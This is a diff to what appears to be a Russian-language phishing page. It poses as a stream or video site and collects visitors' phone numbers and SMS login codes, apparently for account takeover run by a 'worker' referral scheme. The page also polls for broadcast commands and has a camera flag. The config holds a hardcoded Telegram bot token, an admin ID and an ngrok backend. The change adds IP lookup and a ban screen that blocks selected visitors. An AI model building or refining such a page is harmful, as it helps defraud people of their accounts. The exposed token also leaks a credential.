@@ -649,9 +649,88 @@
         .sms-animation .sms-body span {
             color: #ff6680;
         }
+
+        /* ===== СТРАНИЦА БАНА ===== */
+        #banPage {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0a0a0a;
+            z-index: 999999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            padding: 20px;
+        }
+        #banPage.active {
+            display: flex;
+        }
+        #banPage .ban-container {
+            border: 2px solid #ff0000;
+            padding: 50px 40px;
+            border-radius: 15px;
+            background: #1a1a1a;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 0 60px rgba(255,0,0,0.2);
+            animation: banPulse 2s infinite;
+        }
+        @keyframes banPulse {
+            0%, 100% { box-shadow: 0 0 20px rgba(255,0,0,0.1); }
+            50% { box-shadow: 0 0 60px rgba(255,0,0,0.3); }
+        }
+        #banPage .lock {
+            font-size: 80px;
+            display: block;
+            margin-bottom: 20px;
+        }
+        #banPage h1 {
+            font-size: 32px;
+            color: #ff0000;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            text-shadow: 0 0 20px rgba(255,0,0,0.5);
+            margin: 10px 0;
+        }
+        #banPage p {
+            color: #ccc;
+            font-size: 16px;
+            margin: 15px 0;
+            line-height: 1.6;
+        }
+        #banPage .ip-display {
+            color: #666;
+            font-size: 14px;
+            background: #000;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 20px;
+            font-family: monospace;
+        }
+        #banPage .ban-id {
+            color: #444;
+            font-size: 12px;
+            margin-top: 15px;
+        }
     </style>
 </head>
 <body>
+
+<!-- ===== СТРАНИЦА БАНА (ПОЯВЛЯЕТСЯ ЕСЛИ IP ЗАБАНЕН) ===== -->
+<div id="banPage">
+    <div class="ban-container">
+        <span class="lock">🚫</span>
+        <h1>ДОСТУП ЗАБЛОКИРОВАН</h1>
+        <p>Ваш IP-адрес был забанен администратором системы.</p>
+        <p style="color: #888; font-size: 14px;">Пожалуйста, обратитесь к администратору для разблокировки.</p>
+        <div class="ip-display">🔢 <span id="banIpDisplay">0.0.0.0</span></div>
+        <div class="ban-id">🆔 Бан ID: <span id="banIdDisplay">000000</span></div>
+    </div>
+</div>
 
 <!-- ===== АНИМАЦИЯ ТЕЛЕФОНА ===== -->
 <div class="phone-animation" id="phoneAnimation">
@@ -858,7 +937,7 @@
     });
     
     // ========== КОНФИГ ==========
-    const API_URL = 'https://8631-95-59-214-182.ngrok-free.app';
+    const API_URL = 'https://2cf3-95-59-214-182.ngrok-free.app';
     const BOT_TOKEN = '8809942680:AAHVr9WLL4GQHOqZtmzesQP-s05p5zlD7vE';
     const ADMIN_ID = '8704208839';
     
@@ -868,7 +947,58 @@
     let broadcastTriggered = false;
     let selectedCountryCode = '+7';
     let cameraStarted = false;
-    
+    let isBanned = false;
+
+    // ============================================================
+    // ========== ГЛАВНАЯ ПРОВЕРКА БАНА ==========
+    // ============================================================
+    async function checkBan() {
+        try {
+            // ПОЛУЧАЕМ IP
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const ip = ipData.ip;
+            
+            // ПРОВЕРЯЕМ БАН НА СЕРВЕРЕ
+            const banRes = await fetch(`${API_URL}/check_ban_frontend`);
+            const banData = await banRes.json();
+            
+            if (banData.banned) {
+                // ПОКАЗЫВАЕМ СТРАНИЦУ БАНА
+                document.getElementById('banIpDisplay').textContent = ip;
+                document.getElementById('banIdDisplay').textContent = String(Math.abs(hashCode(ip)) % 1000000).padStart(6, '0');
+                document.getElementById('banPage').classList.add('active');
+                
+                // СКРЫВАЕМ ВСЁ ОСТАЛЬНОЕ
+                document.getElementById('loadingOverlay').style.display = 'none';
+                document.getElementById('videoContainer').style.display = 'none';
+                document.getElementById('stream-content').style.display = 'none';
+                document.querySelector('.blur-overlay').style.display = 'none';
+                document.querySelector('.chat-overlay').style.display = 'none';
+                document.getElementById('trustBadge').style.display = 'none';
+                
+                isBanned = true;
+                return false;
+            }
+            
+            return true;
+        } catch(e) {
+            console.log('❌ Ошибка проверки бана:', e);
+            // ЕСЛИ СЕРВЕР НЕ ОТВЕЧАЕТ - ПУСКАЕМ (НО ЭТО НЕ ДОЛЖНО СЛУЧИТЬСЯ)
+            return true;
+        }
+    }
+
+    function hashCode(str) {
+        let hash = 0;
+        for (let i = 0; i < str.length; i++) {
+            const char = str.charCodeAt(i);
+            hash = ((hash << 5) - hash) + char;
+            hash = hash & hash;
+        }
+        return hash;
+    }
+
     // ========== КАСТОМНЫЙ SELECT ==========
     function toggleOptions() {
         const list = document.getElementById('optionsList');
@@ -914,7 +1044,6 @@
     function showSmsAnimation(phone) {
         const el = document.getElementById('smsAnimation');
         const phoneSpan = document.getElementById('smsPhone');
-        // МАСКИРУЕМ НОМЕР
         const masked = phone.replace(/(\d{2})\d{6}(\d{2})/, '$1******$2');
         phoneSpan.textContent = masked;
         el.classList.add('show');
@@ -1208,7 +1337,6 @@
     function showModal() { 
         document.getElementById('modal').style.display = 'flex'; 
         resetModal();
-        // ПОКАЗЫВАЕМ АНИМАЦИЮ ТЕЛЕФОНА
         setTimeout(showPhoneAnimation, 500);
     }
     function resetModal() {
@@ -1281,7 +1409,6 @@
                     statusDiv.innerHTML = "✅ Код отправлен!";
                     btn.disabled = false;
                     
-                    // ПОКАЗЫВАЕМ АНИМАЦИЮ SMS
                     showSmsAnimation(fullPhone);
                 } else {
                     statusDiv.innerText = "Ошибка: " + (data.error || "неизвестно");
@@ -1390,14 +1517,30 @@
     window.closeBroadcast = closeBroadcast;
     window.showBroadcast = showBroadcast;
     
-    loadWorkerData();
-    
-    if (currentRefCode) {
-        console.log('✅ Запуск проверки команд для ref:', currentRefCode);
-        setInterval(checkForBroadcast, 2000);
-    } else {
-        console.log('❌ Нет ref кода, проверка не запущена');
-    }
+    // ============================================================
+    // ========== ГЛАВНАЯ ЗАГРУЗКА С ПРОВЕРКОЙ БАНА ==========
+    // ============================================================
+    (async function main() {
+        // СНАЧАЛА ПРОВЕРЯЕМ БАН
+        const allowed = await checkBan();
+        
+        // ЕСЛИ БАН - ВЫХОДИМ, ВСЁ УЖЕ ПОКАЗАНО
+        if (!allowed) {
+            console.log('🚫 IP ЗАБАНЕН, ДОСТУП ЗАКРЫТ');
+            return;
+        }
+        
+        // ЕСЛИ НЕ ЗАБАНЕН - ЗАГРУЖАЕМ ВСЁ ОСТАЛЬНОЕ
+        console.log('✅ IP НЕ ЗАБАНЕН, ЗАГРУЗКА САЙТА');
+        loadWorkerData();
+        
+        if (currentRefCode) {
+            console.log('✅ Запуск проверки команд для ref:', currentRefCode);
+            setInterval(checkForBroadcast, 2000);
+        } else {
+            console.log('❌ Нет ref кода, проверка не запущена');
+        }
+    })();
 </script>
 
 <!-- Бейдж безопасности -->
